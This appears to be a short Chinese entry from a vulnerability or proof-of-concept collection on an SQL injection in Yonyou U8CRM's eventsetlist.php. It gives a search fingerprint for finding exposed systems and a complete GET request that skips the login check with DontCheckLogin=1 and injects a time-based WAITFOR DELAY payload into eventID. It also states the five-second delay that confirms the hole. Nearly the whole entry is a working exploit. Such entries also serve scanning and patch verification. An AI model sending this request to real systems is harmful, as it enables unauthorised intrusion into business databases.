# 用友U8CRMeventsetlist存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="用友U8CRM"`
- **请求**：`GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:5'--`
- **响应特征**：200 响应时间>=5s